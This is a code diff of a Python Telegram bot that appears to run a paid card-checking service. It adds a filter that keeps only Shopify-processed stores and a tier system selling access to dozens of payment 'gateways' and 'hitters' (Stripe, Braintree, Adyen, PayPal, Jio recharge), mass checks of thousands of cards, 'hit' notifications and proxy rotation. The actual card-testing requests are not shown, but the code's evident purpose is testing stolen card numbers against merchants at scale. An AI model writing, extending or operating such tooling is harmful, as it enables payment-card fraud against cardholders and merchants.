@@ -40,6 +40,7 @@ import functools
 import atexit
 import concurrent.futures
 import asyncio
+from telegram.error import BadRequest, TimedOut
 from functools import partial
 import asyncio
 import random
@@ -96,6 +97,57 @@ MAX_CONCURRENT_USERS = 2000
 # REMOVED the global semaphore that was blocking all users
 # user_semaphore = Semaphore(MAX_CONCURRENT_USERS)
 
+VALID_SHOPIFY_GATEWAYS = [
+    "shopify payments",
+    "shopify",
+    "shopify_payments",
+    "Shopify Payments",
+]
+
+# Any gateway matching these patterns is considered FAKE
+FAKE_GATEWAY_PATTERNS = [
+    "1razorpay",
+    "cards onsite",
+    "onsite by",
+    "authorize.net",
+    "authorizenet",
+    "onerway",
+    "direct",
+    "square",
+    "Site requires login!",
+    "worldpay",
+    "checkout.com",
+    "2checkout",
+    "mollie",
+    "klarna",
+    "affirm",
+    "sezzle",
+    "afterpay",
+]
+def is_real_shopify_gateway(gateway_name: str) -> bool:
+    """
+    Check if a gateway name indicates a REAL Shopify store.
+    Returns False if it's a fake/deceptive gateway.
+    """
+    if not gateway_name:
+        return False
+    
+    gateway_lower = gateway_name.lower().strip()
+    
+    # Check for known fake patterns first (highest priority)
+    for pattern in FAKE_GATEWAY_PATTERNS:
+        if pattern in gateway_lower:
+            print(f"🚫 [FAKE GATEWAY] Detected: '{gateway_name}' (matched pattern: '{pattern}')")
+            return False
+    
+    # Only accept if it's explicitly a Shopify gateway
+    for valid in VALID_SHOPIFY_GATEWAYS:
+        if valid in gateway_lower:
+            return True
+    
+    # Unknown gateway = treat as fake (safer default)
+    print(f"⚠️ [UNKNOWN GATEWAY] '{gateway_name}' — not recognized as Shopify")
+    return False
 
 
 # ============ SESSION RECOVERY SYSTEM ============
@@ -2618,7 +2670,7 @@ async def send_key_redeem_notification(
         elif duration == 1:
             price_display = "Free"
         elif duration == 7:
-            price_display = "$7"
+            price_display = "$5"
         elif duration == 15:
             price_display = "$15"
         elif duration == 30:
@@ -2635,7 +2687,7 @@ async def send_key_redeem_notification(
         "target": "5377336227533969892",
         "skull": "5042167377869932162",
         "id": "5307905813451397794",
-        "money": "6002386288612653951",
+        "money": "5438548621127615575",
         "fire": "5471133374264684999",
         "clock": "5262540380301191210",
         "trophy": "5188344996356448758",
@@ -2668,7 +2720,7 @@ async def send_key_redeem_notification(
     notification = (
         f'  {premium_emoji(PREMIUM_EMOJI_IDS["diamond"], "💎")}'
         f' <b> New Plan Purchase </b>\n'
-        f'═══════════════════\n\n'
+        f'\n'
         f'<b> User</b> ➛ <b>{user_display}</b>\n'
         f'<b> Plan</b>  ➛ <b>{plan_emoji} {tier.upper()}</b>\n'
         f'<b> Price</b>  ➛ <b>{price_display}</b>\n'
@@ -19009,7 +19061,7 @@ async def tn_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "flower":   "6230927657257668107",
         "pink":     "5041796412954641308",
         "doller":   "5197434882321567830",
-        "alien":    "5869573060030683138",
+        "alien":    "5298822932577937495",
         "devil":    "6268012745776588577",
         "star":     "6282793227057632654",
         "trophy":   "5188344996356448758",
@@ -22047,8 +22099,8 @@ async def send_hit_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "fire": "5471133374264684999",      # 🔥
             "skull": "5042167377869932162",      # 💀
             "target": "5377336227533969892",     # 🎯
-            "alien": "5869573060030683138",      # 👾
-            "money": "6002386288612653951",      # 🙈
+            "alien": "5298822932577937495",      # 👾
+            "money": "5438548621127615575",      # 🙈
             "smile": "6230927657257668107",      # 😁
             "devil": "6268012745776588577",      # 😈
         }
@@ -22229,7 +22281,7 @@ async def send_hit_notification(context: ContextTypes.DEFAULT_TYPE,
         "fire": "5471133374264684999",
         "clock": "5262540380301191210",
         "id": "5307905813451397794",
-        "money": "6002386288612653951",
+        "money": "5438548621127615575",
         "receipt": "5226929552319594190",
         "lock": "5197288647275071607",
     }
@@ -22324,10 +22376,10 @@ PREMIUM_EMOJI_IDS = {
     "shopify": "5041796412954641308",      # 💎
     "razorpay": "5377336227533969892",     # 🎯
     "stripe": "5368324170671202286",       # 💳
-    "autosopi": "5869573060030683138",     # 👾
+    "autosopi": "5298822932577937495",     # 👾
     "payflow": "6230927657257668107",      # 💸
     "braintree": "5041796412954641308",    # 🔷
-    "b3charged": "6002386288612653951",    # 💰
+    "b3charged": "5438548621127615575",    # 💰
     
     # UI elements
     "progress": "5039670412733055750",     # 🔥
@@ -22339,8 +22391,8 @@ PREMIUM_EMOJI_IDS = {
     # Time/Stats
     "time": "5382194935057372936",         # ⏱️
     "stats": "5028746137645876535",        # 📊
-    "users": "5869573060030683138",        # 👥
-    "server": "6002386288612653951",       # 💻
+    "users": "5298822932577937495",        # 👥
+    "server": "5438548621127615575",       # 💻
     
     # Misc
     "lock": "5197288647275071607",         # 🔐
@@ -23126,117 +23178,203 @@ def can_access_gateway(self, user_id: int, gateway: str) -> bool:
     return gateway in self.TIERS[tier]["can_access_gateways"]
 
 
+# ============ USER MANAGEMENT SYSTEM ============
+
+# ============ USER MANAGEMENT SYSTEM ============
+
 class UserManager:
-    """Complete user management system with improved tiers and worker mode"""
-    
+    """
+    Complete user management system with tier-based access control
+    and a credit system for free-tier users.
+
+    Free users:
+      - Get INITIAL_FREE_CREDITS (250) credits on first use
+      - 1 credit = 1 single card check
+      - Can access a limited set of gateways when they have >= 1 credit
+      - Cannot mass check
+
+    Paid users (premium, ultimate, admin):
+      - Full access to their tier's gateway list
+      - Unlimited credits
+      - Mass check allowed (per tier's batch size)
+    """
+
+    # ─────────────────────────────────────────────────────────────
+    # Gateways that FREE users can access when they have >= 1 credit
+    # Each single check consumes 1 credit.
+    # ─────────────────────────────────────────────────────────────
+    FREE_TIER_CREDIT_GATEWAYS = [
+        "stripe_chk",        # /chk
+        "shopify",           # /sh
+       # /st (forcesforchange)
+    ]
+
+    # ─────────────────────────────────────────────────────────────
+    # Tier definitions
+    # ─────────────────────────────────────────────────────────────
     TIERS = {
         "free": {
-        "max_checks_per_day": 0,
-        "max_batch_size": 0,
-        "can_use_proxy": True,
-        "can_access_gateways": [
-            
-
-            # <-- ADD THIS LINE
-            # Add other gateways you want free users to access
-        ],
-        "can_add_autosopi_sites": False,
-        "can_mass_check": False,
-        "rate_limit": 10,
-        "concurrency": 1,
-        "workers": 1,
-        "worker_delay": 10,
-        "color": "🥲",
-        "price": "$0",
-        "emoji": "🆓",
-        "speed_cph": 180
-    },
+            "max_checks_per_day": 0,
+            "max_batch_size": 0,
+            "can_use_proxy": True,
+            "can_access_gateways": [],
+            "can_add_autosopi_sites": False,
+            "can_mass_check": False,
+            "rate_limit": 10,
+            "concurrency": 1,
+            "workers": 1,
+            "worker_delay": 10,
+            "color": "\U0001FAE5",
+            "price": "$0",
+            "emoji": "\U0001F193",
+            "speed_cph": 180,
+        },
         "premium": {
             "max_checks_per_day": 500000,
             "max_batch_size": 3000,
             "can_use_proxy": True,
             "can_access_gateways": [
-
+                "shopify",
+                "auto_stripe",
+                "paypal",
+                "stripe_charge",
+                "stripe_charge_v2",
+                "stripe_auth",
+                "stripe_auth0",
+                "stripe_1usd",
+                "stripe_chk",
+                "stripe_pl",
+                "paypal_donation",
+                "paypal_donation_50",
+                "razorpay",
+                "razorpay2",
+                "razorpay_gate2",
+                "braintree",
+                "autosopi",
+                "payflow",
+                "adyen",
+                "adyen_direct",
+                "b3charged",
+                "st1",
+                "st1_gateway",
+                "boutique",
+                "ezycourse",
+                "united_way",
+                "dabbagh",
+                "stripe_4usd",
+                "new_stripe",
+                "stc1",
+                "sc1",
+                "princess",
+                "payglocal",
+                "whop",
+                "stco",
+                "jhit",
             ],
             "can_add_autosopi_sites": True,
             "can_mass_check": True,
             "rate_limit": 0.2,
             "concurrency": 1,
-            "workers": 5,       # 5 sequential workers
-            "worker_delay": 1.0,  # 1 second between cards
-            "color": "🔥",
+            "workers": 5,
+            "worker_delay": 1.0,
+            "color": "\U0001F525",
             "price": "$10/month",
-            "emoji": "💎",
-            "speed_cph": 300  # 5 cards per minute
+            "emoji": "\U0001F48E",
+            "speed_cph": 300,
         },
         "ultimate": {
             "max_checks_per_day": 1000000,
             "max_batch_size": 20000,
             "can_use_proxy": True,
             "can_access_gateways": [
-                "shopify", "auto_stripe", "adyen_direct", "paypal", "stripe_charge_v2","adyen","stripe_pl","stripe_auth0",
-                "b3charged", "razorpay", "stripe_charge", "stripe_auth","paypal_donation", "stripe_chk", "st1_gateway" ,
-                "dork", "braintree", "autosopi", "payflow" "stripe_1usd", "payglocal", "stco",    # Stripe Checkout Hitter
-                "jhit",    # Jio Recharge Hitter
-                "whop" 
+                "shopify", "auto_stripe", "adyen_direct", "paypal",
+                "stripe_charge_v2", "adyen", "stripe_pl", "stripe_auth0",
+                "b3charged", "razorpay", "stripe_charge", "stripe_auth",
+                "paypal_donation", "stripe_chk", "st1_gateway",
+                "dork", "braintree", "autosopi", "payflow",
+                "stripe_1usd", "payglocal", "stco", "jhit", "whop",
+                "razorpay2", "razorpay_gate2",
+                "boutique", "ezycourse", "united_way", "dabbagh",
+                "stripe_4usd", "new_stripe", "stc1", "sc1",
+                "princess", "st1",
             ],
             "can_add_autosopi_sites": True,
             "can_mass_check": True,
             "rate_limit": 0.1,
             "concurrency": 1,
-            "workers": 10,      # 10 sequential workers
-            "worker_delay": 0.8,  # 0.8 seconds between cards
-            "color": "😈",
+            "workers": 10,
+            "worker_delay": 0.8,
+            "color": "\U0001F608",
             "price": "$20/month",
-            "emoji": "👑",
-            "speed_cph": 600  # 10 cards per minute
+            "emoji": "\U0001F451",
+            "speed_cph": 600,
         },
         "admin": {
-            "max_checks_per_day": float('inf'),
+            "max_checks_per_day": float("inf"),
             "max_batch_size": 1000000,
             "can_use_proxy": True,
             "can_access_gateways": [
-                "paypal", "shopify", "adyen_direct", "auto_stripe","stripe_charge_v2", "adyen","stripe_pl","stripe_auth0",
-                "b3charged", "razorpay", "stripe_charge", "stripe_auth", "paypal_donation",
-                "braintree", "autosopi", "payflow", "stripe_chk","st1_gateway" , "stripe_1usd", "payglocal", "stco",    # Stripe Checkout Hitter
-                "jhit",    # Jio Recharge Hitter
-                "whop" 
+                "paypal", "shopify", "adyen_direct", "auto_stripe",
+                "stripe_charge_v2", "adyen", "stripe_pl", "stripe_auth0",
+                "b3charged", "razorpay", "stripe_charge", "stripe_auth",
+                "paypal_donation", "braintree", "autosopi", "payflow",
+                "stripe_chk", "st1_gateway", "stripe_1usd", "payglocal",
+                "stco", "jhit", "whop",
+                "razorpay2", "razorpay_gate2",
+                "boutique", "ezycourse", "united_way", "dabbagh",
+                "stripe_4usd", "new_stripe", "stc1", "sc1",
+                "princess", "st1",
             ],
             "can_add_autosopi_sites": True,
             "can_mass_check": True,
             "rate_limit": 0,
             "concurrency": 10,
-            "workers": 20,      # 20 sequential workers
-            "worker_delay": 0.5,  # 0.5 seconds between cards
-            "color": "💀",
-            "price": "∞",
-            "emoji": "👑",
-            "speed_cph": 5000  # 20 cards per minute
-        }
+            "workers": 20,
+            "worker_delay": 0.5,
+            "color": "\U0001F480",
+            "price": "\u221E",
+            "emoji": "\U0001F451",
+            "speed_cph": 5000,
+        },
     }
-    
+
+    # ─────────────────────────────────────────────────────────────
+    # Init / persistence
+    # ─────────────────────────────────────────────────────────────
     def __init__(self, data_file=USER_DATA_FILE):
         self.data_file = data_file
         self.users = self.load_users()
         self.cache = {}
         for uid, data in self.users.items():
-            self.cache[int(uid)] = data
-        
+            try:
+                self.cache[int(uid)] = data
+            except (ValueError, TypeError):
+                continue
+
     def load_users(self):
         if Path(self.data_file).exists():
             try:
-                with open(self.data_file, 'r') as f:
+                with open(self.data_file, "r", encoding="utf-8") as f:
                     return json.load(f)
-            except:
+            except Exception as e:
+                print(f"\u26A0\uFE0F Error loading users: {e}")
                 return {}
         return {}
-    
+
     def save_users(self):
-        with open(self.data_file, 'w') as f:
-            json.dump(self.users, f, indent=2)
-    
+        try:
+            with open(self.data_file, "w", encoding="utf-8") as f:
+                json.dump(self.users, f, indent=2)
+        except Exception as e:
+            print(f"\u26A0\uFE0F Error saving users: {e}")
+
+    # ─────────────────────────────────────────────────────────────
+    # User lookup / creation
+    # ─────────────────────────────────────────────────────────────
     def get_user(self, user_id: int) -> dict:
+        """Get user record, creating a default one if it doesn't exist."""
         user_id_str = str(user_id)
+
         if user_id_str not in self.users:
             tier = "admin" if user_id == OWNER_ID else "free"
             self.users[user_id_str] = {
@@ -23256,268 +23394,325 @@ class UserManager:
                 "upgraded_from": None,
                 "credits_used": 0,
                 "keys_redeemed": 0,
-                "last_credit_reset": time.time()
+                "last_credit_reset": time.time(),
             }
             self.cache[user_id] = self.users[user_id_str]
             self.save_users()
+
         return self.users[user_id_str]
-    
+
     def update_user_info(self, user_id: int, username: str, first_name: str):
         user = self.get_user(user_id)
         user["username"] = username
         user["first_name"] = first_name
         self.save_users()
-    
+
+    # ─────────────────────────────────────────────────────────────
+    # Tier helpers
+    # ─────────────────────────────────────────────────────────────
     def get_tier(self, user_id: int) -> str:
+        """Return the active tier, auto-expiring paid tiers if needed."""
         user = self.get_user(user_id)
         tier = user["tier"]
-        
-        if user.get("tier_expiry", 0) > 0 and user["tier_expiry"] < time.time():
-            original_tier = user.get("upgraded_from", "free")
+
+        expiry = user.get("tier_expiry", 0)
+        if expiry > 0 and expiry < time.time():
+            original_tier = user.get("upgraded_from", "free") or "free"
             user["tier"] = original_tier
             user["tier_expiry"] = 0
             user["upgraded_from"] = None
             self.save_users()
             return original_tier
-        
+
         return tier
-    
+
     def set_tier(self, user_id: int, tier: str, admin_id: int) -> bool:
+        """Admin-only manual tier override."""
         if admin_id != OWNER_ID:
             return False
         if tier not in self.TIERS:
             return False
+
         user = self.get_user(user_id)
         user["tier"] = tier
         user["last_reset"] = time.time()
         self.save_users()
         return True
-    
+
+    # ─────────────────────────────────────────────────────────────
+    # Gateway access — kept for backward compatibility
+    # ─────────────────────────────────────────────────────────────
     def can_access_gateway(self, user_id: int, gateway: str) -> bool:
+        """
+        Boolean-only gateway access check. Kept for backward compatibility.
+        For richer error reporting, use check_gateway_access().
+        """
+        allowed, _reason, _msg = self.check_gateway_access(user_id, gateway)
+        return allowed
+
+    # ─────────────────────────────────────────────────────────────
+    # Gateway access — rich check with reason + message
+    # ─────────────────────────────────────────────────────────────
+    def check_gateway_access(self, user_id: int, gateway: str):
+        """
+        Return (allowed, reason_code, error_message).
+
+        reason_code:
+          - "ok"            -> allowed
+          - "no_credits"    -> free user, 0 credits
+          - "not_in_tier"   -> paid user, gateway not in their tier list
+          - "not_in_free"   -> free user has credits but gateway not whitelisted
+          - "unknown_tier"  -> fallback
+        """
+        # Owner bypass
+        if user_id == OWNER_ID:
+            return True, "ok", ""
+
         tier = self.get_tier(user_id)
-        return gateway in self.TIERS[tier]["can_access_gateways"]
-    
+        gw = (gateway or "").lower().strip()
+
+        # ---- Paid tiers ----
+        if tier in ("premium", "ultimate", "admin"):
+            if gw in self.TIERS[tier]["can_access_gateways"]:
+                return True, "ok", ""
+            return (
+                False,
+                "not_in_tier",
+                f"\u274C <b>{gateway.replace('_', ' ').title()} not available "
+                f"for {tier.upper()} tier</b>\n\n"
+                f"USE /buy TO UPGRADE YOUR TIER \U0001F48E"
+            )
+
+        # ---- Free tier ----
+        if tier == "free":
+            try:
+                credits = get_user_credits(user_id)
+            except Exception:
+                credits = 0
+
+            if credits <= 0:
+                return (
+                    False,
+                    "no_credits",
+                    "\U0001F48E <b>Insufficient Credits!</b>\n\n"
+                    "USE /buy TO UPGRADE YOUR TIER \U0001F48E"
+                )
+
+            if gw in self.FREE_TIER_CREDIT_GATEWAYS:
+                return True, "ok", ""
+
+            return (
+                False,
+                "not_in_free",
+                f"\u274C <b>{gateway.replace('_', ' ').title()} not available "
+                f"for FREE tier</b>\n\n"
+                f"USE /buy TO UPGRADE YOUR TIER \U0001F48E"
+            )
+
+        return False, "unknown_tier", "\u274C Gateway not available."
+
+    # ─────────────────────────────────────────────────────────────
+    # Other capability checks
+    # ─────────────────────────────────────────────────────────────
     def can_mass_check(self, user_id: int) -> bool:
-        """Check if user can use mass check"""
         tier = self.get_tier(user_id)
         return self.TIERS[tier].get("can_mass_check", False)
-    
+
     def can_add_autosopi_sites_directly(self, user_id: int) -> bool:
         tier = self.get_tier(user_id)
         return self.TIERS[tier].get("can_add_autosopi_sites", False)
-    
-    def check_rate_limit(self, user_id: int) -> Tuple[bool, float]:
+
+    def can_use_proxy(self, user_id: int) -> bool:
+        """True if the tier allows it, or a global pool is available."""
+        tier = self.get_tier(user_id)
+
+        if self.TIERS[tier]["can_use_proxy"]:
+            return True
+
+        try:
+            if global_proxy_pool.enabled and global_proxy_pool.proxies:
+                return True
+        except Exception:
+            pass
+
+        return False
+
+    # ─────────────────────────────────────────────────────────────
+    # Rate / daily limits
+    # ─────────────────────────────────────────────────────────────
+    def check_rate_limit(self, user_id: int):
         user = self.get_user(user_id)
         tier = self.get_tier(user_id)
         rate_limit = self.TIERS[tier]["rate_limit"]
-        
+
         if rate_limit == 0:
             return True, 0
-        
+
         last_check = user.get("last_check", 0)
         time_diff = time.time() - last_check
-        
+
         if time_diff < rate_limit:
-            wait_time = rate_limit - time_diff
-            return False, wait_time
+            return False, rate_limit - time_diff
+
         return True, 0
-    
-    def check_daily_limit(self, user_id: int) -> Tuple[bool, int]:
+
+    def check_daily_limit(self, user_id: int):
         user = self.get_user(user_id)
         tier = self.get_tier(user_id)
         max_checks = self.TIERS[tier]["max_checks_per_day"]
-        
-        if max_checks == float('inf'):
+
+        if max_checks == float("inf") or max_checks == 0:
             return True, 0
-        
+
         today = datetime.now().strftime("%Y-%m-%d")
-        if "daily_checks" not in user:
-            user["daily_checks"] = {}
-        
+        user.setdefault("daily_checks", {})
+
         cutoff = (datetime.now() - timedelta(days=7)).strftime("%Y-%m-%d")
-        user["daily_checks"] = {k: v for k, v in user["daily_checks"].items() if k >= cutoff}
-        
+        user["daily_checks"] = {
+            k: v for k, v in user["daily_checks"].items() if k >= cutoff
+        }
+
         daily_checks = user["daily_checks"].get(today, 0)
-        
+
         if daily_checks >= max_checks:
             return False, max_checks
+
         return True, max_checks - daily_checks
-    
+
+    # ─────────────────────────────────────────────────────────────
+    # Counters
+    # ─────────────────────────────────────────────────────────────
     def increment_checks(self, user_id: int, count: int = 1):
         user = self.get_user(user_id)
         user["total_checks"] += count
         user["last_check"] = time.time()
-        
+
         today = datetime.now().strftime("%Y-%m-%d")
-        if "daily_checks" not in user:
-            user["daily_checks"] = {}
+        user.setdefault("daily_checks", {})
         user["daily_checks"][today] = user["daily_checks"].get(today, 0) + count
         self.save_users()
-    
+
     def increment_hits(self, user_id: int):
         user = self.get_user(user_id)
         user["total_hits"] = user.get("total_hits", 0) + 1
         self.save_users()
-    
+
     def increment_sites_added(self, user_id: int):
         user = self.get_user(user_id)
         user["sites_added"] = user.get("sites_added", 0) + 1
         self.save_users()
-    
+
+    # ─────────────────────────────────────────────────────────────
+    # Batch / concurrency helpers
+    # ─────────────────────────────────────────────────────────────
     def get_max_batch_size(self, user_id: int) -> int:
         tier = self.get_tier(user_id)
         return self.TIERS[tier]["max_batch_size"]
-    
+
     def get_concurrency(self, user_id: int) -> int:
         tier = self.get_tier(user_id)
         return self.TIERS[tier]["concurrency"]
-    
-    def can_use_proxy(self, user_id: int) -> bool:
-     """Check if user can use proxies (personal or global)"""
-     tier = self.get_tier(user_id)
-    
-     # If user tier allows proxies, they can use them
-     if self.TIERS[tier]["can_use_proxy"]:
-        return True
-    
-     # Even if tier doesn't allow personal proxies, they can use global
-     if global_proxy_pool.enabled and global_proxy_pool.proxies:
-        return True
-    
-     return False
-    
-    # ============ WORKER MODE METHODS ============
-    
+
+    # ─────────────────────────────────────────────────────────────
+    # Worker-mode helpers
+    # ─────────────────────────────────────────────────────────────
     def get_worker_config(self, user_id: int) -> dict:
-        """Get worker configuration for user"""
         tier = self.get_tier(user_id)
         config = self.TIERS[tier]
         return {
             "workers": config.get("workers", 3),
             "delay": config.get("worker_delay", 1.0),
             "name": f"{config['emoji']} {tier.upper()}",
-            "speed_cph": config.get("speed_cph", 180)
+            "speed_cph": config.get("speed_cph", 180),
         }
-    
+
     def get_worker_display(self, user_id: int) -> str:
-        """Get formatted worker info for display"""
-        config = self.get_worker_config(user_id)
-        return f"{config['workers']} workers ({config['delay']}s delay)"
-    
-    # ============ CREDIT SYSTEM METHODS ============
-    
-    def get_user_credits(self, user_id: int) -> int:
-        """
-        Get user's remaining credits
-        Returns: credits remaining (int) or float('inf') for paid users
-        """
+        cfg = self.get_worker_config(user_id)
+        return f"{cfg['workers']} workers ({cfg['delay']}s delay)"
+
+    # ─────────────────────────────────────────────────────────────
+    # Credit system helpers
+    # ─────────────────────────────────────────────────────────────
+    def get_user_credits(self, user_id: int):
+        """Return credits — infinity for paid users, real balance for free."""
         tier = self.get_tier(user_id)
-        if tier != 'free':
-            return float('inf')
+        if tier != "free":
+            return float("inf")
         return get_user_credits(user_id)
-    
+
     def has_enough_credits(self, user_id: int, required: int = 1) -> bool:
-        """
-        Check if user has enough credits for a check
-        Returns: True if has enough credits or is paid user
-        """
         tier = self.get_tier(user_id)
-        if tier != 'free':
+        if tier != "free":
             return True
-        credits = get_user_credits(user_id)
-        return credits >= required
-    
-    def use_credit(self, user_id: int, amount: int =  CREDITS_PER_SINGLE_CHECK) -> bool:
-        """
-        Use credits for a check (only for free users)
-        Returns: True if successful, False if not enough credits
-        """
+        return get_user_credits(user_id) >= required
+
+    def use_credit(self, user_id: int, amount: int = CREDITS_PER_SINGLE_CHECK) -> bool:
+        """Deduct credits (free users only). Returns True on success."""
         tier = self.get_tier(user_id)
-        if tier != 'free':
+        if tier != "free":
             return True
+
         if deduct_user_credits(user_id, amount):
             user = self.get_user(user_id)
             user["credits_used"] = user.get("credits_used", 0) + amount
             self.save_users()
             return True
         return False
-    
-    def initialize_user_credits(self, user_id: int) -> int:
-        """
-        Initialize credits for new user (only if free tier)
-        Returns: initial credits amount
-        """
+
+    def initialize_user_credits(self, user_id: int):
         tier = self.get_tier(user_id)
-        if tier != 'free':
-            return float('inf')
+        if tier != "free":
+            return float("inf")
+
         current = get_user_credits(user_id)
         if current > 0:
             return current
+
         return initialize_new_user_credits(user_id)
-    
+
     def get_credits_display(self, user_id: int) -> str:
-        """
-        Get formatted credit display for user
-        Returns: string like "250 credits" or "∞ (Unlimited)"
-        """
         tier = self.get_tier(user_id)
-        if tier != 'free':
-            return "∞ (Unlimited)"
-        credits = get_user_credits(user_id)
-        return f"{credits} credits"
-    
-    def add_credits(self, user_id: int, amount: int) -> int:
-        """
-        Add credits to a user (admin only)
-        Returns: new total
-        """
+        if tier != "free":
+            return "\u221E (Unlimited)"
+        return f"{get_user_credits(user_id)} credits"
+
+    def add_credits(self, user_id: int, amount: int):
         tier = self.get_tier(user_id)
-        if tier != 'free':
-            return float('inf')
+        if tier != "free":
+            return float("inf")
         return add_user_credits(user_id, amount)
-    
-    def set_credits(self, user_id: int, amount: int) -> int:
-        """
-        Set exact credits for a user (admin only)
-        Returns: new total
-        """
+
+    def set_credits(self, user_id: int, amount: int):
         tier = self.get_tier(user_id)
-        if tier != 'free':
-            return float('inf')
+        if tier != "free":
+            return float("inf")
         user_credits[user_id] = amount
         save_user_credits()
         return amount
-    
-    def reset_credits(self, user_id: int) -> int:
-        """
-        Reset user credits to initial amount (admin only)
-        Returns: new total
-        """
+
+    def reset_credits(self, user_id: int):
         tier = self.get_tier(user_id)
-        if tier != 'free':
-            return float('inf')
+        if tier != "free":
+            return float("inf")
         reset_user_credits(user_id)
         return INITIAL_FREE_CREDITS
-    
+
     def get_credits_stats(self, user_id: int) -> dict:
-        """
-        Get detailed credit statistics for a user
-        """
         tier = self.get_tier(user_id)
         user = self.get_user(user_id)
-        
-        if tier != 'free':
+
+        if tier != "free":
             return {
                 "tier": tier,
                 "unlimited": True,
-                "credits": float('inf'),
+                "credits": float("inf"),
                 "used": user.get("credits_used", 0),
-                "remaining": float('inf')
+                "remaining": float("inf"),
             }
-        
+
         credits = get_user_credits(user_id)
         used = user.get("credits_used", 0)
-        
+
         return {
             "tier": "free",
             "unlimited": False,
@@ -23525,29 +23720,30 @@ class UserManager:
             "used": used,
             "remaining": credits,
             "cost_per_check": CREDITS_PER_SINGLE_CHECK,
-            "estimated_checks": credits // CREDITS_PER_SINGLE_CHECK
+            "estimated_checks": credits // CREDITS_PER_SINGLE_CHECK,
         }
-    
+
+    # ─────────────────────────────────────────────────────────────
+    # Stats / listing
+    # ─────────────────────────────────────────────────────────────
     def get_user_stats(self, user_id: int) -> dict:
-        """Get complete user stats including credit info and worker config"""
         user = self.get_user(user_id)
         tier = self.get_tier(user_id)
         today = datetime.now().strftime("%Y-%m-%d")
         daily = user.get("daily_checks", {}).get(today, 0)
-        
+
         tier_expiry = user.get("tier_expiry", 0)
         if tier_expiry > 0:
-            expiry_date = datetime.fromtimestamp(tier_expiry).strftime("%Y-%m-%d %H:%M")
+            expiry_date = datetime.fromtimestamp(tier_expiry).strftime(
+                "%Y-%m-%d %H:%M"
+            )
             expiry_text = f" (expires: {expiry_date})"
         else:
             expiry_text = ""
-        
-        # Get credit info
+
         credit_info = self.get_credits_stats(user_id)
-        
-        # Get worker config
         worker_config = self.get_worker_config(user_id)
-        
+
         return {
             "tier": tier,
             "color": self.TIERS[tier]["color"],
@@ -23564,7 +23760,9 @@ class UserManager:
             "joined": datetime.fromtimestamp(user["joined"]).strftime("%Y-%m-%d"),
             "rate_limit": self.TIERS[tier]["rate_limit"],
             "price": self.TIERS[tier]["price"],
-            "can_add_sites_directly": self.TIERS[tier].get("can_add_autosopi_sites", False),
+            "can_add_sites_directly": self.TIERS[tier].get(
+                "can_add_autosopi_sites", False
+            ),
             "can_mass_check": self.TIERS[tier].get("can_mass_check", False),
             "sites_added": user.get("sites_added", 0),
             "expiry_text": expiry_text,
@@ -23573,55 +23771,67 @@ class UserManager:
             "credits_used": credit_info.get("used", 0),
             "credits_unlimited": credit_info.get("unlimited", False),
             "estimated_checks": credit_info.get("estimated_checks", 0),
-            "keys_redeemed": user.get("keys_redeemed", 0)
+            "keys_redeemed": user.get("keys_redeemed", 0),
         }
-    
+
     def list_users(self) -> List[dict]:
-        """List all users with credit info and worker config"""
         users_list = []
         for uid, data in self.users.items():
             today = datetime.now().strftime("%Y-%m-%d")
             tier = data.get("tier", "free")
-            
+
             if data.get("tier_expiry", 0) > 0 and data["tier_expiry"] < time.time():
-                tier = data.get("upgraded_from", "free")
-            
-            # Get credit info
-            credits = get_user_credits(int(uid)) if tier == 'free' else "∞"
-            
-            # Get worker config
-            worker_config = self.TIERS[tier]
+                tier = data.get("upgraded_from", "free") or "free"
+
+            try:
+                credits = get_user_credits(int(uid)) if tier == "free" else "\u221E"
+            except (ValueError, TypeError):
+                credits = 0
+
+            worker_config = self.TIERS.get(tier, self.TIERS["free"])
             workers = worker_config.get("workers", 3)
-            
-            users_list.append({
-                "id": uid,
-                "username": data.get("username", "Unknown"),
-                "tier": tier,
-                "workers": workers,
-                "total_checks": data.get("total_checks", 0),
-                "total_hits": data.get("total_hits", 0),
-                "daily_checks": data.get("daily_checks", {}).get(today, 0),
-                "joined": datetime.fromtimestamp(data.get("joined", 0)).strftime("%Y-%m-%d"),
-                "last_active": datetime.fromtimestamp(data.get("last_check", 0)).strftime("%Y-%m-%d %H:%M") if data.get("last_check") else "Never",
-                "sites_added": data.get("sites_added", 0),
-                "tier_expiry": data.get("tier_expiry", 0),
-                "credits": credits,
-                "credits_used": data.get("credits_used", 0),
-                "keys_redeemed": data.get("keys_redeemed", 0)
-            })
+
+            users_list.append(
+                {
+                    "id": uid,
+                    "username": data.get("username", "Unknown"),
+                    "tier": tier,
+                    "workers": workers,
+                    "total_checks": data.get("total_checks", 0),
+                    "total_hits": data.get("total_hits", 0),
+                    "daily_checks": data.get("daily_checks", {}).get(today, 0),
+                    "joined": datetime.fromtimestamp(
+                        data.get("joined", 0)
+                    ).strftime("%Y-%m-%d"),
+                    "last_active": datetime.fromtimestamp(
+                        data.get("last_check", 0)
+                    ).strftime("%Y-%m-%d %H:%M")
+                    if data.get("last_check")
+                    else "Never",
+                    "sites_added": data.get("sites_added", 0),
+                    "tier_expiry": data.get("tier_expiry", 0),
+                    "credits": credits,
+                    "credits_used": data.get("credits_used", 0),
+                    "keys_redeemed": data.get("keys_redeemed", 0),
+                }
+            )
+
         return sorted(users_list, key=lambda x: x["total_checks"], reverse=True)
-    
+
     def reset_daily_limits(self):
-        """Reset daily limits for all users"""
-        today = datetime.now().strftime("%Y-%m-%d")
-        for uid, user in self.users.items():
-            if "daily_checks" not in user:
-                user["daily_checks"] = {}
+        for _uid, user in self.users.items():
+            user.setdefault("daily_checks", {})
             cutoff = (datetime.now() - timedelta(days=7)).strftime("%Y-%m-%d")
-            user["daily_checks"] = {k: v for k, v in user["daily_checks"].items() if k >= cutoff}
+            user["daily_checks"] = {
+                k: v for k, v in user["daily_checks"].items() if k >= cutoff
+            }
         self.save_users()
-        
-    
+
+
+# ─────────────────────────────────────────────────────────────
+# Global instance
+# ─────────────────────────────────────────────────────────────
+user_manager = UserManager()
     
 
         
@@ -24334,10 +24544,13 @@ async def info_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     else:
         credit_display = "∞ (Unlimited)"
     
+    
+    diamond_emoji   = premium_emoji(PREMIUM_EMOJI_IDS.get("diamond", "5427168083074628963"), "💎")
+    
     # Build the info message
     info_msg = (
-        f"🔍 <b>INFO BLADESARKS_BOT ⚡️</b>\n"
-
+        f"{diamond_emoji} <b>INFO BLADESARKS_BOT </b>\n"
+        f" \n"
         f" 𝙄𝘿: <code>{target_id}</code>\n"
